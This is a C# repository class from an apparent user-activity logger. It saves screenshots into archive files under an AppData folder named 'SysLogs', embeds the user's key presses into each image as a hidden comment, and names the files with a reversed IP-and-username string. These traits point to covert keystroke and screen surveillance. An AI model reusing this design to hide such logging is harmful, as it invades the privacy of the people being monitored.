using Core;
using EventPublisher;
using FileSystem;
using System;
using System.Collections.Generic;
using System.Drawing.Imaging;
using System.IO;

namespace UserActivityLogger
{
    public class ActivityRepositary : IActivityRepositary
    {
        private IJarFileWriter _jarFileWriter;
        private IImageCommentEmbedder _imageCommentEmbedder;
        private readonly IJarFileFactory _jarFileFactory;
        private string _dataFolder;

        //TODO: one consturctor only inject only dependencies  
        public ActivityRepositary(IJarFileFactory jarFileFactory, IImageCommentEmbedder imageCommentEmbedder)
        {
            _jarFileFactory = jarFileFactory;
            _imageCommentEmbedder = imageCommentEmbedder;
            _dataFolder = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "SysLogs");
        }

        public string DataFolder
        {
            get
            {
                return _dataFolder;
            }
        }

        public void Add(Activity activity)
        {
            CreateNewJarFileWriterIfRequired();

            var headers = new Dictionary<string, string>();
            var screenShotBytes = activity.ScreenShot.ToByteArray();
            var item = new JarFileItem(headers, screenShotBytes, -1);

            _imageCommentEmbedder.AddComment(new MemoryStream(screenShotBytes), activity.KeyPressedData);

            try
            {
                _jarFileWriter.AddFile(item);
            }
            catch (JarFileReachedMaxLimitException)
            {
                //TO DO: move this event to appropiate class or remove
                EventContainer.PublishEvent(
                    Events.LogFileReachedMaxLimit.ToString(),
                    new EventArg(Guid.NewGuid(), _jarFileWriter.JarFilePath));

                CreateNewJarFileWriter();

                _jarFileWriter.AddFile(item);
            }
        }
        public ActivityReader GetReader(IEnumerable<string> files)
        {
            return new ActivityReader(files, _jarFileFactory, null);
        }
        private void CreateNewJarFileWriter()
        {
            var ipUser = IPAddress.GetCurrentMachineIp() + RuntimeHelper.GetCurrentUserName();

            var logFilePath = Path.Combine(_dataFolder, ipUser.ReverseMe()) + "_" + Guid.NewGuid() + "."
                              + Constants.JarFileExtension;
            DisposeCurrentJarFile();

            _jarFileWriter = _jarFileFactory.GetJarFileWriter(logFilePath);
        }

        private void CreateNewJarFileWriterIfRequired()
        {
            if (_jarFileWriter == null)
            {
                CreateNewJarFileWriter();
            }
        }

        private void DisposeCurrentJarFile()
        {
            if (_jarFileWriter != null)
            {
                _jarFileWriter.Dispose();
            }
        }
    }
}
